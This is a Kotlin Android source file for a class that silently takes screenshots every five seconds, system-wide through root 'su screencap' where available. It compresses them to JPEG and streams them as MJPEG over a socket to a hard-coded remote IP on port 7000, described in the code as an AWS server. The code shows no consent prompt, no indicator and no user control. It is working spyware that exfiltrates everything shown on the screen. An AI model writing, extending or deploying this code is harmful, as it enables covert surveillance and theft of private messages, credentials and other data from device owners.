package com.example.mobsec_823

import android.app.Activity
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.view.PixelCopy
import android.view.Window
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.OutputStream
import java.net.Socket
import java.util.Collections
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

/**
 * Captures screenshots every 5 seconds and streams them as an MJPEG video.
 * Supports in-app capture via Activity or system-wide capture via Root.
 * Automatically forwards/pushes the stream to AWS server 47.129.144.9 on port 7000.
 */
class carne(private val context: Context, private val activity: Activity? = null) {
    private val screenshots = Collections.synchronizedList(mutableListOf<ByteArray>())
    private val scheduler = Executors.newSingleThreadScheduledExecutor()
    private var isRunning = false

    // Remote AWS Destination Configuration
    private val remoteIp = "47.129.144.9"
    private val remotePort = 7000

    private var totalFramesCaptured = 0

    fun start() {
        if (isRunning) return
        isRunning = true

        // 1. Capture Task: Runs every 5 seconds
        scheduler.scheduleWithFixedDelay({
            if (isRunning) {
                // Prioritize root capture to allow system-wide screenshots (outside of app)
                if (isRootAvailable()) {
                    captureWithRoot()
                } else if (activity != null) {
                    // Fallback to in-app capture if root is not available but activity is provided
                    captureInApp(activity)
                } else {
                    Log.e("ScreenshotTest", "Root not available and no activity provided. Cannot capture screenshots.")
                }
            }
        }, 0, 5, TimeUnit.SECONDS)

        // 2. Automated Forwarding: Push stream to AWS Port 7000
        startRemoteForwarding()
    }

    private fun isRootAvailable(): Boolean {
        return try {
            val process = Runtime.getRuntime().exec("su")
            val os = process.outputStream
            os.write("id\nexit\n".toByteArray())
            os.flush()
            val reader = process.inputStream.bufferedReader()
            val output = reader.readText()
            process.waitFor()
            output.contains("uid=0")
        } catch (e: Exception) {
            // Check for su binary in common paths as a fallback check
            val paths = arrayOf("/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su")
            paths.any { File(it).exists() }
        }
    }

    private fun captureInApp(act: Activity) {
        val window: Window = act.window
        val view = window.decorView
        if (view.width <= 0 || view.height <= 0) return

        val bitmap = Bitmap.createBitmap(view.width, view.height, Bitmap.Config.ARGB_8888)
        val handlerThread = HandlerThread("PixelCopyThread")
        handlerThread.start()
        val handler = Handler(handlerThread.looper)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            PixelCopy.request(window, bitmap, { result ->
                if (result == PixelCopy.SUCCESS) {
                    processBitmap(bitmap)
                }
                bitmap.recycle()
                handlerThread.quitSafely()
            }, handler)
        }
    }

    private fun captureWithRoot() {
        try {
            // Using a more robust way to invoke su: opening a shell and writing the command
            val process = Runtime.getRuntime().exec("su")
            val outputStream = process.outputStream

            // Execute screencap and pipe to stdout, then exit su shell
            outputStream.write("screencap -p\n".toByteArray())
            outputStream.write("exit\n".toByteArray())
            outputStream.flush()

            val pngBytes = process.inputStream.readBytes()
            process.waitFor()

            if (pngBytes.isNotEmpty()) {
                val bitmap = BitmapFactory.decodeByteArray(pngBytes, 0, pngBytes.size)
                if (bitmap != null) {
                    processBitmap(bitmap)
                    bitmap.recycle()
                } else {
                    Log.e("ScreenshotTest", "Failed to decode bitmap from root capture")
                }
            }
        } catch (e: Exception) {
            Log.e("ScreenshotTest", "Root capture failed: ${e.message}")
            if (e.message?.contains("Permission denied") == true) {
                Log.e("ScreenshotTest", "Root access was denied. Please grant root permission to the app.")
            }
        }
    }

    private fun processBitmap(bitmap: Bitmap) {
        val out = ByteArrayOutputStream()
        // Compress to JPEG for MJPEG stream compatibility
        bitmap.compress(Bitmap.CompressFormat.JPEG, 60, out)
        val bytes = out.toByteArray()

        synchronized(screenshots) {
            screenshots.add(bytes)
            totalFramesCaptured++
            // Keep last 60 frames (approx 5 minutes of history)
            if (screenshots.size > 60) {
                screenshots.removeAt(0)
            }
        }
    }

    private fun startRemoteForwarding() {
        Thread {
            while (isRunning) {
                var socket: Socket? = null
                try {
                    Log.d("ScreenshotTest", "Forwarding: Connecting to AWS $remoteIp:$remotePort...")
                    socket = Socket(remoteIp, remotePort)
                    val outputStream = socket.getOutputStream()

                    // Sending a simple MJPEG stream header for the remote receiver
                    val header = "POST /remote-stream HTTP/1.1\r\n" +
                            "Host: $remoteIp\r\n" +
                            "Content-Type: multipart/x-mixed-replace; boundary=--frame\r\n" +
                            "Transfer-Encoding: chunked\r\n" +
                            "Connection: keep-alive\r\n" +
                            "\r\n"
                    outputStream.write(header.toByteArray())

                    var remoteFramesSentCount = 0

                    while (isRunning && !socket.isClosed) {
                        val frameToSend = getNextFrame(remoteFramesSentCount)
                        if (frameToSend != null) {
                            sendMjpegFrame(outputStream, frameToSend)
                            // Advance to the next frame in sequence
                            remoteFramesSentCount = Math.max(remoteFramesSentCount + 1, totalFramesCaptured - screenshots.size + 1)
                            Thread.sleep(1000)
                        } else {
                            Thread.sleep(500)
                        }
                    }
                } catch (e: Exception) {
                    Log.e("ScreenshotTest", "Forwarding Failed: ${e.message}. Retrying in 10s...")
                    Thread.sleep(10000)
                } finally {
                    try { socket?.close() } catch (ex: Exception) {}
                }
            }
        }.start()
    }

    private fun getNextFrame(lastSentIndex: Int): ByteArray? {
        return synchronized(screenshots) {
            val historyCount = screenshots.size
            if (historyCount == 0) return@synchronized null

            val globalStartOffset = totalFramesCaptured - historyCount

            // If it's a new connection, start from the beginning of our buffer
            val targetIndex = if (lastSentIndex == 0) globalStartOffset else lastSentIndex
            val indexInBuffer = targetIndex - globalStartOffset

            if (indexInBuffer < 0) {
                screenshots[0] // Buffer rolled over, jump to oldest available
            } else if (indexInBuffer < historyCount) {
                screenshots[indexInBuffer]
            } else {
                null // Waiting for new frame
            }
        }
    }

    private fun sendMjpegFrame(out: OutputStream, frame: ByteArray) {
        try {
            out.write("--frame\r\n".toByteArray())
            out.write("Content-Type: image/jpeg\r\n".toByteArray())
            out.write("Content-Length: ${frame.size}\r\n".toByteArray())
            out.write("\r\n".toByteArray())
            out.write(frame)
            out.write("\r\n".toByteArray())
            out.flush()
        } catch (e: Exception) {
            // Error writing to stream, connection likely closed
            throw e
        }
    }

    fun stop() {
        isRunning = false
        scheduler.shutdown()
    }
}
